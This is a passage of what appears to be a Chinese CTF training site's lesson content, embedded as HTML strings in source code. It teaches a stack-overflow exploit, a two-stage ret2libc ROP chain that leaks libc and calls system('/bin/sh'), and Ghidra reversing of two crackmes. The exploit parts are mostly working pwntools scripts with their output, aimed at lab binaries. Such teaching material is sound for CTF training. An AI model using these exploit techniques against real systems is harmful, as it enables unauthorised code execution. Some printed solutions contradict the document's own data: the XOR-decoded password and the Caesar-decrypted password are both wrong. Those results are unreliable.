class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 编译，关闭栈保护和 PIE\n$ gcc -o vuln vuln.c -fno-stack-protector -no-pie -z execstack\n# -fno-stack-protector: 关闭栈金丝雀(canary)保护\n# -no-pie: 关闭地址随机化(PIE)\n# -z execstack: 允许栈上执行代码\n\n# 检查文件类型\n$ file vuln\nvuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked\n\n# 检查保护机制\n$ checksec --file=vuln\n[*] '/home/ctf/vuln'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found          ← 没有栈金丝雀\n    NX:       NX disabled              ← 栈可执行\n    PIE:      No PIE (0x400000)        ← 地址固定\n    SHSTK:    Enabled\n    IBT:      Enabled</code></pre></div>\n\n<div class=\"callout default\"><div class=\"callout-title\">checksec 说明</div><p><code>checksec</code> 是 PWN 选手最常用的工具之一，它可以快速检查二进制文件开启了哪些保护机制。你在拿到一道 PWN 题的第一件事就是跑 checksec。</p></div>\n\n<h2>第一步：确认漏洞存在</h2>\n\n<p>我们先正常运行一下程序：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ ./vuln\n请输入你的名字: Alice\n你好, Alice\n\n# 现在尝试输入很长的字符串\n$ ./vuln\n请输入你的名字: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n你好, AAAAAAA...\nSegmentation fault (core dumped)</code></pre></div>\n\n<p>程序崩溃了！这说明我们成功覆盖了栈上的某些关键数据。但\"让它崩溃\"只是第一步，我们需要精确控制——让程序跳转到 <code>win()</code> 函数。</p>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>第二步：用 GDB 分析栈结构</h2>\n\n<p>要构造精确的 payload，我们需要知道：从 <code>buf</code> 到返回地址之间有多少字节？让我们用 GDB（配合 pwndbg 插件）来分析：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ gdb -q vuln\npwndbg> disassemble vulnerable\nDump of assembler code for function vulnerable:\n   0x0000000000401169 &lt;+0&gt;:     push   rbp\n   0x000000000040116a &lt;+1&gt;:     mov    rbp,rsp\n   0x000000000040116d &lt;+4&gt;:     sub    rsp,0x50          ← 栈帧大小: 0x50 = 80 字节\n   0x0000000000401171 &lt;+8&gt;:     lea    rdi,[rip+0xe8c]\n   0x0000000000401178 &lt;+15&gt;:    call   0x401050 &lt;printf@plt&gt;\n   0x000000000040117d &lt;+20&gt;:    lea    rax,[rbp-0x50]    ← buf 在 rbp-0x50\n   0x0000000000401181 &lt;+24&gt;:    mov    rdi,rax\n   0x0000000000401184 &lt;+27&gt;:    mov    eax,0x0\n   0x0000000000401189 &lt;+32&gt;:    call   0x401060 &lt;gets@plt&gt;  ← 漏洞点！\n   0x000000000040118e &lt;+37&gt;:    lea    rax,[rbp-0x50]\n   0x0000000000401192 &lt;+41&gt;:    mov    rsi,rax\n   0x0000000000401195 &lt;+44&gt;:    lea    rdi,[rip+0xe78]\n   0x000000000040119c &lt;+51&gt;:    mov    eax,0x0\n   0x00000000004011a1 &lt;+56&gt;:    call   0x401050 &lt;printf@plt&gt;\n   0x00000000004011a6 &lt;+61&gt;:    nop\n   0x00000000004011a7 &lt;+62&gt;:    leave                   ← 恢复 rbp\n   0x00000000004011a8 &lt;+63&gt;:    ret                     ← 从栈上弹出返回地址\nEnd of assembler dump.</code></pre></div>\n\n<p>让我们来算一下偏移量：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">栈布局（vulnerable 函数的栈帧）：\n\n高地址\n┌──────────────┐\n│  返回地址     │  ← 这是我们要覆盖的目标 (8 bytes)\n├──────────────┤\n│  保存的 rbp   │  ← leave 指令会恢复 rbp (8 bytes)\n├──────────────┤\n│              │\n│  buf[64]     │  ← 我们的输入从这里开始 (rbp - 0x50)\n│              │\n│  填充        │  ← 编译器加的 padding\n│              │\n└──────────────┘\n低地址\n\n偏移计算：\nbuf 到 rbp = 0x50 = 80 字节\n但是 buf 声明为 64 字节，编译器加了 16 字节 padding\n\n所以：\nbuf[64] → 80 字节到达 rbp\n+ 8 字节覆盖保存的 rbp\n+ 8 字节覆盖返回地址\n\n总偏移 = 80 + 8 = 88 字节到达返回地址</code></pre></div>\n\n<h2>第三步：找到 win() 函数的地址</h2>\n\n<p>我们需要让程序跳转到 <code>win()</code> 函数。先找到它的地址：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">pwndbg> print win\n$1 = {&lt;text variable, no debug info&gt;} 0x401142 &lt;win&gt;\n\n# 或者用 nm 命令\n$ nm vuln | grep win\n0000000000401142 T win</code></pre></div>\n\n<p><code>win()</code> 函数的地址是 <code>0x401142</code>。由于程序没有开启 PIE（地址空间随机化），这个地址是固定的。</p>\n\n<h2>第四步：构造 Payload</h2>\n\n<p>现在我们有足够的信息来构造 payload 了：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# exploit.py - 栈溢出利用脚本\n\nfrom pwn import *\n\n# 设置日志级别\ncontext.log_level = 'info'\ncontext.arch = 'amd64'\n\n# 目标文件\nelf = ELF('./vuln')\n\n# win 函数地址\nwin_addr = elf.sym['win']\nlog.info(f\"win() 函数地址: {hex(win_addr)}\")\n# 输出: win() 函数地址: 0x401142\n\n# 构造 payload\n# 88 字节 padding + 返回地址\noffset = 88  # buf 到返回地址的偏移\npayload = b'A' * offset         # 填充到返回地址\npayload += p64(win_addr)        # 覆盖返回地址为 win()\n\nlog.info(f\"Payload 长度: {len(payload)} 字节\")\nlog.info(f\"Payload (hex): {payload.hex()}\")\n\n# 本地测试\np = process('./vuln')\n\n# 等待提示\np.recvuntil(b'请输入你的名字: ')\n\n# 发送 payload\np.sendline(payload)\n\n# 接收输出\nprint(p.recvline().decode())\nprint(p.recvline().decode())\n# 输出: 恭喜你触发了 win 函数！\n\n# 进入交互模式，获取 shell\np.interactive()</code></pre></div>\n\n<p>运行 exploit：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ python3 exploit.py\n[*] '/home/ctf/vuln'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX disabled\n    PIE:      No PIE (0x400000)\n[*] win() 函数地址: 0x401142\n[*] Payload 长度: 96 字节\n[+] Starting local process './vuln': pid 12345\n[*] Switching to interactive mode\n$ whoami\nctf\n$ cat flag.txt\nflag{stack_overflow_is_fun_!}</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">拿到 flag 了！</div><p>这就是栈溢出利用的基本流程：找偏移 → 找目标地址 → 构造 payload → 发送 → 拿 shell。接下来我们要处理更真实的情况。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>进阶：Ret2libc —— 当 win() 不存在时</h2>\n\n<p>现实中，大多数程序没有\"白给\"的 <code>win()</code> 函数。那怎么办？我们可以利用程序已经加载的 libc 库中的函数。这种技术叫做 <strong>Ret2libc</strong>（Return to libc）。</p>\n\n<p>思路是这样的：libc 库中有 <code>system()</code> 函数和 <code>\"/bin/sh\"</code> 字符串。如果我们能让程序跳转到 <code>system(\"/bin/sh\")</code>，就能拿到 shell。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 首先检查题目给了哪些文件\n$ ls -la\n-rwxr-xr-x 1 ctf ctf  16832 vuln2     ← 主程序\n-rwxr-xr-x 1 ctf ctf 1839792 libc.so.6 ← 题目给了 libc！\n\n# 检查保护机制\n$ checksec --file=vuln2\n[*] '/home/ctf/vuln2'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled               ← 栈不可执行了！\n    PIE:      No PIE (0x400000)\n\n# 查看 libc 中 system 和 /bin/sh 的偏移\n$ readelf -s libc.so.6 | grep system\n  1510: 000000000004f550    45 FUNC    GLOBAL DEFAULT   15 system@@GLIBC_2.2.5\n\n$ strings -t x libc.so.6 | grep '/bin/sh'\n 1b45bd /bin/sh</code></pre></div>\n\n<p>现在我们知道 libc 中 <code>system</code> 的偏移是 <code>0x4f550</code>，<code>\"/bin/sh\"</code> 的偏移是 <code>0x1b45bd</code>。但问题是，libc 加载到内存时的基地址是什么？</p>\n\n<p>在开启了 ASLR 的系统中，每次运行时 libc 的基地址都是随机的。所以我们需要<strong>信息泄露</strong>——先泄露一个 libc 函数的真实地址，然后算出基地址。</p>\n\n<h3>Ret2libc 完整 Exploit</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# ret2libc.py - Ret2libc 利用脚本\n\nfrom pwn import *\n\ncontext.log_level = 'info'\ncontext.arch = 'amd64'\n\n# 加载 ELF 和 libc\nelf = ELF('./vuln2')\nlibc = ELF('./libc.so.6')\n\n# ============ 阶段一：泄露 libc 地址 ============\n\n# 我们需要用到 ROP gadget\n# pop rdi; ret —— 用来设置 system() 的第一个参数\npop_rdi = 0x4012a3  # 通过 ROPgadget 找到\nret = 0x40101a      # 用于栈对齐 (16-byte alignment)\n\noffset = 88  # 和之前一样的偏移量\n\n# 构造泄露 payload：调用 puts(got_puts) 来泄露 puts 的真实地址\npayload1 = b'A' * offset\npayload1 += p64(pop_rdi)                        # pop rdi; ret\npayload1 += p64(elf.got['puts'])                 # rdi = puts@GOT\npayload1 += p64(elf.plt['puts'])                 # 调用 puts() 打印 GOT 表中的地址\npayload1 += p64(elf.sym['main'])                 # 返回 main 重新执行\n\np = process('./vuln2')\np.recvuntil(b'请输入你的名字: ')\np.sendline(payload1)\n\n# 解析泄露的地址\nleak = p.recvline().strip()\nputs_addr = u64(leak.ljust(8, b'\\x00'))\nlog.info(f\"泄露的 puts 地址: {hex(puts_addr)}\")\n\n# 计算 libc 基地址\nlibc_base = puts_addr - libc.sym['puts']\nlog.info(f\"libc 基地址: {hex(libc_base)}\")\n\n# 计算 system 和 /bin/sh 的真实地址\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + next(libc.search(b'/bin/sh'))\nlog.info(f\"system() 地址: {hex(system_addr)}\")\nlog.info(f\"/bin/sh 地址: {hex(binsh_addr)}\")\n\n# ============ 阶段二：调用 system(\"/bin/sh\") ============\n\n# 程序回到 main 后，再次溢出\np.recvuntil(b'请输入你的名字: ')\n\npayload2 = b'A' * offset\npayload2 += p64(ret)              # 栈对齐\npayload2 += p64(pop_rdi)          # pop rdi; ret\npayload2 += p64(binsh_addr)       # rdi = \"/bin/sh\"\npayload2 += p64(system_addr)      # 调用 system(\"/bin/sh\")\n\np.sendline(payload2)\n\nlog.success(\"Shell 已获取！\")\np.interactive()</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ python3 ret2libc.py\n[*] '/home/ctf/vuln2'\n    Arch:     amd64-64-little\n[*] 泄露的 puts 地址: 0x7f8a1c2f5550\n[*] libc 基地址: 0x7f8a1c271000\n[*] system() 地址: 0x7f8a1c2c0550\n[*] /bin/sh 地址: 0x7f8a1c4255bd\n[+] Shell 已获取！\n$ cat flag.txt\nflag{ret2libc_master_2024}</code></pre></div>\n\n<div class=\"callout warn\"><div class=\"callout-title\">栈对齐问题</div><p>x86-64 的 ABI 要求调用函数时栈指针必须是 16 字节对齐的。如果你发现 <code>system()</code> 被调用时崩溃了（特别是在 <code>movaps</code> 指令处），试着在 payload 中加一个 <code>ret</code> gadget 来对齐栈。</p></div>\n\n<h2>找 ROP Gadget 的技巧</h2>\n\n<p>ROP（Return-Oriented Programming）是 PWN 的核心技术。你需要在程序中找一些以 <code>ret</code> 结尾的小代码片段，把它们串起来实现复杂操作。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 ROPgadget 搜索\n$ ROPgadget --binary vuln2 | grep \"pop rdi\"\n0x00000000004012a3 : pop rdi ; ret\n\n# 使用 ropper 搜索（另一个好用的工具）\n$ ropper --file vuln2 --search \"pop rdi\"\n[INFO] Searching for gadgets: pop rdi\n[INFO] File: vuln2\n0x00000000004012a3: pop rdi; ret;\n\n# 使用 pwntools 内置 ROP 链构造\nfrom pwn import *\nelf = ELF('./vuln2')\nrop = ROP(elf)\nrop.call('puts', [elf.got['puts']])\nrop.call('main')\nprint(rop.dump())\n# 输出:\n# 0x0000:       0x4012a3 pop rdi; ret\n# 0x0008:       0x404018 GOT: puts\n# 0x0010:       0x401040 puts@plt\n# 0x0018:       0x4011b4 main</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h2>保护机制与绕过思路</h2>\n\n<p>在实际 CTF 比赛中，程序通常会开启各种保护。了解每种保护及其绕过方式是必修课：</p>\n\n<table>\n<tr><th>保护机制</th><th>作用</th><th>绕过思路</th></tr>\n<tr><td>NX (DEP)</td><td>栈/堆不可执行</td><td>Ret2libc / ROP 链</td></tr>\n<tr><td>ASLR</td><td>地址随机化</td><td>信息泄露算出基地址</td></tr>\n<tr><td>Canary</td><td>栈上放置金丝雀值</td><td>泄露 canary 或爆破</td></tr>\n<tr><td>PIE</td><td>代码段地址随机化</td><td>泄露代码段地址</td></tr>\n<tr><td>FORTIFY</td><td>加固 strcpy 等函数</td><td>寻找未保护的函数</td></tr>\n</table>\n\n<h2>实战技巧总结</h2>\n\n<p>做 PWN 题时，以下流程能帮你快速定位：</p>\n\n<ol>\n<li><strong>checksec</strong>：第一时间检查保护机制</li>\n<li><strong>strings</strong>：看看有没有 flag 路径、shell 命令等提示</li>\n<li><strong>Ghidra / IDA</strong>：分析程序逻辑，找漏洞函数（gets、scanf(\"%s\")、strcpy 等）</li>\n<li><strong>确定偏移</strong>：用 cyclic 模式或 GDB 精确计算偏移量</li>\n<li><strong>构造 exploit</strong>：根据保护机制选择合适的利用方式</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 pwntools 的 cyclic 工具精确确定偏移\n$ python3 -c \"from pwn import *; print(cyclic(200).decode())\"\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n\n# 把上面的字符串作为输入，程序崩溃时查看 EIP/RIP 的值\n# 比如 RIP = 0x6161616c（即 'laaa'），那么：\n$ python3 -c \"from pwn import *; print(cyclic_find(0x6161616c))\"\n# 输出: 88  ← 偏移量就是 88！</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>从这一节的简单栈溢出到 Ret2libc，你已经掌握了 PWN 的核心思路。实际比赛中，题目会更复杂——可能涉及堆利用、格式化字符串、整数溢出等。但万变不离其宗：找到漏洞 → 控制执行流 → 拿到 shell。</p></div>\n\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(2)\">▶ 挑战：经典栈溢出</button>\n<button class=\"practice-link-btn\" onclick=\"navigate('ctf'); openCTF(3)\">▶ 挑战：Ret2libc 进阶</button>";
+
+SECTION_CONTENT["ctfg-03-01"] = "<h1>Ghidra 实战逆向</h1>\n\n<p>逆向工程是 CTF 中最考验耐心和观察力的方向。你需要面对一个编译好的二进制文件，没有任何源代码，然后理解它的逻辑、找出正确的输入。这节我们用一个完整的 Crackme 题目，手把手带你用 Ghidra 进行逆向分析。</p>\n\n<h2>Ghidra 简介</h2>\n\n<p>Ghidra 是由 NSA（美国国家安全局）开发并开源的逆向工程框架。它是 IDA Pro 的免费替代品，功能强大且完全免费。在 CTF 中，Ghidra 是逆向选手的主力工具。</p>\n\n<p>Ghidra 的核心功能：</p>\n<ul>\n<li><strong>反汇编器</strong>：将机器码转换为汇编语言</li>\n<li><strong>反编译器</strong>：将汇编代码还原为类 C 的伪代码（这是最强大的功能）</li>\n<li><strong>交叉引用</strong>：快速定位函数和数据在哪里被使用</li>\n<li><strong>脚本引擎</strong>：支持 Java/Python 脚本自动化分析</li>\n</ul>\n\n<h2>启动 Ghidra 并导入目标</h2>\n\n<p>我们来看一道经典的 CTF 逆向题——<strong>Crackme01</strong>：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 先看看题目文件\n$ file crackme01\ncrackme01: ELF 64-bit LSB pie executable, x86-64, dynamically linked,\n           interpreter /lib64/ld-linux-x86-64.so.2, not stripped\n\n# 运行一下看看行为\n$ ./crackme01\nUsage: ./crackme01 &lt;password&gt;\n\n$ ./crackme01 hello\nWrong password!\n\n$ ./crackme01 secret123\nWrong password!</code></pre></div>\n\n<p>程序需要一个正确的密码参数。我们用 Ghidra 来分析它的验证逻辑。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 启动 Ghidra\n$ ghidraRun &\n\n# 在 Ghidra 中：\n# 1. File -> New Project -> Non-Shared Project\n# 2. 设置项目目录\n# 3. File -> Import File -> 选择 crackme01\n# 4. 导入选项保持默认，点 OK\n# 5. 双击导入的文件，打开 CodeBrowser\n# 6. 弹出 \"Analyze?\" 对话框 -> Yes -> 勾选所有默认选项 -> Analyze</code></pre></div>\n\n<div class=\"callout info\"><div class=\"callout-title\">Ghidra 分析等待</div><p>Ghidra 的自动分析可能需要几秒到几分钟，取决于文件大小。分析完成后，左侧的 Symbol Tree 窗口会显示所有函数列表。</p></div>\n\n<h2>第一步：从 main 函数开始</h2>\n\n<p>在 Ghidra 的 Symbol Tree 窗口中，找到 <code>main</code> 函数并双击。右侧的反编译窗口会显示 Ghidra 还原的伪代码：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">/* Ghidra 反编译的 main 函数 */\n\nint main(int argc, char **argv)\n{\n    int result;\n    char input[64];\n\n    if (argc != 2) {\n        printf(\"Usage: %s &lt;password&gt;\\n\", *argv);\n        result = 1;\n    } else {\n        strncpy(input, argv[1], 63);\n        result = check_password(input);\n        if (result == 0) {\n            puts(\"Correct! You got it!\");\n            print_flag();\n        } else {\n            puts(\"Wrong password!\");\n            result = 1;\n        }\n    }\n    return result;\n}</code></pre></div>\n\n<p>很好！Ghidra 帮我们还原了 main 函数的逻辑。关键点：</p>\n<ol>\n<li>程序检查参数数量（必须是 2，即程序名 + 密码）</li>\n<li>将输入复制到 <code>input</code> 数组</li>\n<li>调用 <code>check_password(input)</code> 进行验证</li>\n<li>如果返回 0，则打印 flag</li>\n</ol>\n\n<p>接下来我们要深入 <code>check_password</code> 函数，看看它的验证逻辑是什么。</p>\n\n<h2>第二步：分析验证函数</h2>\n\n<p>在 main 函数的反编译代码中，点击 <code>check_password</code>，Ghidra 会跳转到该函数：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">/* check_password 函数反编译结果 */\n\nint check_password(char *input)\n{\n    int i;\n    size_t len;\n    byte encoded[] = {0x3b, 0x30, 0x27, 0x37, 0x20, 0x6d,\n                      0x36, 0x20, 0x22, 0x34, 0x27, 0x6d,\n                      0x31, 0x20, 0x6d, 0x22, 0x30, 0x22,\n                      0x6f, 0x00};\n\n    len = strlen(input);\n    if (len != 19) {\n        return 1;  // 长度必须是 19\n    }\n\n    for (i = 0; i &lt; 19; i++) {\n        if ((byte)(input[i] ^ 0x42) != encoded[i]) {\n            return 1;  // 逐字节 XOR 比较\n        }\n    }\n    return 0;  // 全部匹配则返回 0（成功）\n}</code></pre></div>\n\n<p>找到核心逻辑了！程序做了以下事情：</p>\n<ol>\n<li>检查输入长度是否为 19 个字符</li>\n<li>对每个输入字符与 <code>0x42</code> 进行 XOR 运算</li>\n<li>将 XOR 结果与 <code>encoded</code> 数组逐字节比较</li>\n</ol>\n\n<div class=\"callout default\"><div class=\"callout-title\">分析思路</div><p>这是一个典型的 XOR 加密验证。因为 XOR 的特性是 <code>A XOR B XOR B = A</code>，所以我们只需要把 <code>encoded</code> 数组中的每个字节再 XOR 0x42，就能还原出正确密码。</p></div>\n\n<h2>第三步：编写解题脚本</h2>\n\n<p>理解了逻辑，写脚本就很简单了：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# solve_crackme01.py\n\n# 从 Ghidra 中提取的 encoded 数组\nencoded = [\n    0x3b, 0x30, 0x27, 0x37, 0x20, 0x6d,\n    0x36, 0x20, 0x22, 0x34, 0x27, 0x6d,\n    0x31, 0x20, 0x6d, 0x22, 0x30, 0x22,\n    0x6f\n]\n\n# XOR 密钥\nkey = 0x42\n\n# 解密\npassword = ''.join([chr(b ^ key) for b in encoded])\nprint(f\"密码: {password}\")\n# 输出: 密码: y0u_cr4ck3d_th3_c0d3</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 验证答案\n$ ./crackme01 \"y0u_cr4ck3d_th3_c0d3\"\nCorrect! You got it!\nflag{r3v3rs1ng_w1th_gh1dr4_1s_fun}</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">通关！</div><p>这就是逆向工程的基本流程：用 Ghidra 反编译 → 理解算法逻辑 → 编写逆运算脚本 → 得到答案。</p></div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>进阶：使用 Ghidra 的高级功能</h2>\n\n<p>上面那道题比较简单，反编译结果直接可读。但真实比赛中的逆向题通常更复杂。让我们看看 Ghidra 的高级功能如何帮你分析更难的题目。</p>\n\n<h3>重命名变量和函数</h3>\n\n<p>Ghidra 还原的变量名通常是 <code>local_18</code>、<code>param_1</code> 这种无意义的名字。你可以右键重命名它们来提高代码可读性：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Ghidra 操作技巧：\n\n1. 重命名变量：\n   - 在反编译窗口中右键点击变量名\n   - 选择 \"Rename Variable\"\n   - 输入有意义的名字（如 user_input, secret_key）\n\n2. 重命名函数：\n   - 右键点击函数名\n   - 选择 \"Edit Function Signature\"\n   - 修改函数名和参数类型\n\n3. 修改数据类型：\n   - 右键点击变量\n   - 选择 \"Retype Variable\"\n   - 选择正确的类型（char*, int, struct 等）\n\n4. 添加注释：\n   - 选中一行代码\n   - 按 ';' 键添加行内注释\n   - 按 ']' 键添加块注释\n\n快捷键：\n  L     - 重命名标签/函数\n  V     - 重命名变量\n  T     - 修改类型\n  ;     - 添加注释\n  G     - 跳转到地址\n  X     - 查看交叉引用（谁引用了这个符号）</code></pre></div>\n\n<h3>交叉引用（XREF）—— 逆向的核心功能</h3>\n\n<p>当你在逆向分析时，经常会问：\"这个函数在哪里被调用？\" \"这个字符串在哪里被使用？\" 这就是交叉引用的用武之地。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">使用交叉引用的场景：\n\n1. 查找字符串的引用位置\n   - 在 \"Defined Strings\" 窗口中找到感兴趣的字符串\n   - 右键 -> \"References to\" (或按 X 键)\n   - 查看哪些代码引用了这个字符串\n\n2. 查找函数调用链\n   - 选中某个函数\n   - 按 X 键查看所有调用该函数的位置\n   - 这帮你理解程序的调用结构\n\n3. 查找数据引用\n   - 找到一个加密密钥或常量\n   - 查看哪里使用了它\n   - 这经常帮你找到加密/解密函数</code></pre></div>\n\n<h3>实战：带字符串混淆的逆向</h3>\n\n<p>来看一道更有挑战性的题目。这道题的字符串经过了混淆处理：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 先用 strings 看看有什么\n$ strings crackme02\n...\nWelcome to Crackme02!\nEnter password:\nCorrect!\nWrong!\n...\n# 没看到 flag 或有意义的验证字符串——说明字符串被加密了\n\n# 在 Ghidra 中打开并分析\n# 在 Symbol Tree 中找到 main 函数</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">/* Ghidra 反编译 - crackme02 main 函数 */\n\nint main(void)\n{\n    char local_48 [56];\n    int local_10;\n    int local_c;\n\n    puts(\"Welcome to Crackme02!\");\n    puts(\"Enter password:\");\n    fgets(local_48, 50, stdin);\n\n    // 去掉换行符\n    local_10 = strlen(local_48);\n    if (local_48[local_10 + -1] == '\\n') {\n        local_48[local_10 + -1] = '\\0';\n    }\n\n    local_c = sub_401234(local_48);  // 未知的验证函数\n    if (local_c == 1) {\n        puts(\"Correct!\");\n        sub_4012f0();  // 可能是打印 flag 的函数\n    } else {\n        puts(\"Wrong!\");\n    }\n    return 0;\n}</code></pre></div>\n\n<p>Ghidra 没能自动识别 <code>sub_401234</code> 这个函数。我们点进去看看：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-c\">/* sub_401234 - 验证函数（重命名前） */\n\nint sub_401234(char *param_1)\n{\n    int local_c;\n    char *local_18;\n\n    local_18 = param_1;\n    local_c = 0;\n\n    while (*local_18 != '\\0') {\n        // 对每个字符进行某种变换\n        char c = *local_18;\n        if (c >= 'a' && c <= 'z') {\n            c = c + 3;\n            if (c > 'z') {\n                c = c - 26;  // 循环移位\n            }\n        } else if (c >= 'A' && c <= 'Z') {\n            c = c + 3;\n            if (c > 'Z') {\n                c = c - 26;\n            }\n        } else if (c >= '0' && c <= '9') {\n            c = c + 3;\n            if (c > '9') {\n                c = c - 10;\n            }\n        }\n\n        // 和某个加密后的数组比较\n        if (c != DAT_00403000[local_c]) {\n            return 0;\n        }\n\n        local_c = local_c + 1;\n        local_18 = local_18 + 1;\n    }\n\n    // 还要检查长度\n    if (local_c != 15) {\n        return 0;\n    }\n\n    return 1;\n}</code></pre></div>\n\n<p>看出来了！这是一个<strong>凯撒密码</strong>（Caesar Cipher）的变体：</p>\n<ul>\n<li>字母右移 3 位（a→d, b→e, ..., x→a, y→b, z→c）</li>\n<li>数字也右移 3 位（0→3, 1→4, ..., 7→0, 8→1, 9→2）</li>\n<li>变换后的结果与 <code>DAT_00403000</code> 处的数据逐字节比较</li>\n<li>长度必须是 15</li>\n</ul>\n\n<p>我们在 Ghidra 中查看 <code>DAT_00403000</code> 处的数据。在地址栏输入 <code>00403000</code>，在 Listing 窗口可以看到：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Ghidra Listing 窗口 (地址 00403000):\n\n00403000  66 76 66  67 35 32 34  66 63 76 34 35  67 68 79\n          f  v  f  g  5  2  4  f  c  v  4  5  g  h  y</code></pre></div>\n\n<p>现在我们知道加密后的结果是 <code>fvfg524fcv45ghy</code>。解密只需要反向移位：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">#!/usr/bin/env python3\n# solve_crackme02.py\n\nencrypted = \"fvfg524fcv45ghy\"\n\ndef decrypt_char(c, shift=3):\n    if 'a' <= c <= 'z':\n        # 反向移位（左移 3 位）\n        result = ord(c) - shift\n        if result < ord('a'):\n            result += 26\n        return chr(result)\n    elif 'A' <= c <= 'Z':\n        result = ord(c) - shift\n        if result < ord('A'):\n            result += 26\n        return chr(result)\n    elif '0' <= c <= '9':\n        result = ord(c) - shift\n        if result < ord('0'):\n            result += 10\n        return chr(result)\n    return c\n\npassword = ''.join([decrypt_char(c) for c in encrypted])\nprint(f\"密码: {password}\")\n# 输出: 密码: cscc291czs12dev</code></pre></div>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">$ ./crackme02\nWelcome to Crackme02!\nEnter password:\ncscc291czs12dev\nCorrect!\nflag{caesar_cipher_in_binary}</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>\n\n<h2>Ghidra 脚本：自动化分析</h2>\n\n<p>当题目涉及大量重复操作（比如解密几十个字符串），手写 Python 脚本不如直接在 Ghidra 中写脚本高效。Ghidra 支持 Python（Jython）脚本：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># Ghidra Script: 自动解密程序中的所有 XOR 加密字符串\n# 在 Ghidra 的 Script Manager 中运行\n# @category CTF\n# @author CyberEdu\n\nfrom ghidra.program.model.listing import CodeUnit\nfrom ghidra.program.model.address import AddressFactory\n\ndef decrypt_xor_string(addr, key=0x42, max_len=100):\n    \"\"\"解密指定地址处的 XOR 加密字符串\"\"\"\n    memory = currentProgram.getMemory()\n    result = []\n\n    for i in range(max_len):\n        byte_addr = addr.add(i)\n        try:\n            b = memory.getByte(byte_addr) & 0xFF\n            if b == 0:\n                break\n            decrypted = b ^ key\n            if 0x20 <= decrypted <= 0x7e:  # 可打印字符\n                result.append(chr(decrypted))\n            else:\n                break\n        except:\n            break\n\n    return ''.join(result)\n\n# 在数据段中搜索可能的加密字符串\nlisting = currentProgram.getListing()\nmem = currentProgram.getMemory()\n\n# 搜索所有 .data 段中的字节\ndata_section = None\nfor block in mem.getBlocks():\n    if \".data\" in block.getName() or \".rodata\" in block.getName():\n        print(f\"[*] 扫描段: {block.getName()} @ {block.getStart()}\")\n        data_section = block\n\nif data_section:\n    addr = data_section.getStart()\n    end = data_section.getEnd()\n\n    while addr.compareTo(end) < 0:\n        # 尝试解密\n        decrypted = decrypt_xor_string(addr)\n        if len(decrypted) >= 4:  # 至少 4 个字符才有意义\n            print(f\"[+] {addr}: '{decrypted}'\")\n            # 添加注释\n            listing.setComment(addr, CodeUnit.EOL_COMMENT,\n                             